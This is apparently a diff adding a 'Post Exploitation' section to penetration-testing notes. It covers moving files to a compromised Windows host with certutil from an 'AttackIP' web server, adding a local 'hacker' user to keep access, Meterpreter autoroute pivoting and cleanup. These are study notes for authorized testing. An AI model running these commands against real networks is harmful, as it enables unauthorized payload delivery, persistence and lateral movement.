@@ -227,5 +227,78 @@ You are looking for maybe a 301 redirect or a significant change in the length. 
 
 For password spraying, we would need to remove the password option from the above and only have the username list added and switch the Attack Type to sniper. Then, you would add a specific password. NOTE! Since you are most likely doing this against AD, make sure to ask before you attempt this and say: "Hey, how many attempts have you set before you lock the accounts?"
 
+-----------------------------------------------------------------------------------------------------------------------------------------------
+
+4. Post Exploitation
+
+File Transfers
+
+We can host files in many different ways, but a simply python command to spin up a web server is useful. 
+
+syntax: python -m SimpleHTTPServer 80 
+This will allow us to transfer files from our attack machine to any machine on the network. The files must be in the directory where we start up the web server.
+
+On Windows, we can then grab the files using:
+
+syntax: certutil.exe -urlcache -f http://AttackIP/filename filename
+
+If certutil is being blocked, then we could also host an ftp server using python and then connect via ftp from the Windows machine. 
+
+syntax: python -m pyftpdlib 21 (on the attack machine)
+on the Windows machine
+ftp AttackIP
+On Linux we could use wget.
+
+Maintaining Access
+
+Most of the time, as a pen tester, we are not going to do much to maintain access, as that is not the point. However, if we see that they are not picking up anything we are doing, we could add a user on a local machine.
+
+syntax: net user hacker password123 /add
+
+Pivoting
+
+Once we have exploited a machine, it is a good idea to see what else is out there that we can´t see. 
+
+syntax on Windows: route print
+
+This will show us the routing and we will be able to see if there are any additional network adapters connected.
+
+syntax: ipconfig (would also show us if there are dual nics)
+
+syntax: arp -a 
+
+This will show us which machines it is talking to.
+
+If we have a meterpreter shell we can do the following:
+
+syntax: run autoroute -s IPrangeofnewnic/subnet
+(example: run autoroute -s 10.10.0.0/24)
+
+Then we can confirm it:
+
+syntax: run autoroute -p
+
+if confirmed, then background the session:
+
+syntax: background
+
+syntax: search portscan
+syntax: use 5 (tcp portscanner)
+syntax: options
+syntax: set RHOSTS IPofnewmachine
+syntax: set PORTS portnrs (if needed)
+syntax: run
+
+NOTE: Check out proxychains. There are other methods to pivot and here are some good tools: https://pentestwiki.org/pivoting/ and some further reading: https://miloserdov.org/?p=2973
+
+Cleanup
+
+Make sure the network the same it was when you entered it. Delete files, added users etc from the systems. Set the configs back. 
+
+
+
+
+
+
 
 
